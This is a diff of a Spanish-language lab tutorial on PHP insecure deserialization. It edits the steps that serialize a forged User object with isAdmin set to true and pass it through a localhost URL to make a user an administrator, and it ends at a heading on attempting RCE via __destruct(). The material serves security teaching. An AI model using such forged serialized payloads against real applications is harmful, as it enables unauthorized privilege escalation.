@@ -189,7 +189,7 @@ Alvaro podría haber cambiado su estado, convirtiéndose en administrador.
 
 **2 - Crear un archivo para crear la serialización con los datos que se deseen.**
 
-Crear el archivo **HackerAdmin.php**  y ejecutar este código en la máquina atacante:
+Creamos el archivo [HackerAdmin.php](Recursos/HackerAdmin.php) y ejecutamos este código en la máquina atacante:
 
 ~~~
 <?php
@@ -201,16 +201,11 @@ echo urlencode(serialize(new User()));
 ?>
 ~~~
 
-Salida esperada (ejemplo):
+Salida:
 
-~~~
-O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22hacker%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D
-~~~
+![salidaHacker](images/4.png)
 
 Este objeto serializado podemos usarlo para enviarlo a MostrarObjeto.php y así hacker sería administrador.
-
-![](images/UD6.png)
-
 
 - Copiar la salida obtenida
 
@@ -225,7 +220,7 @@ http://localhost/MostrarObjdeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22
 ~~~
 
 
-![](images/UD2.png)
+![hacker_admin](images/5.png)
 
 
 **Intentar RCE con __destruct()**
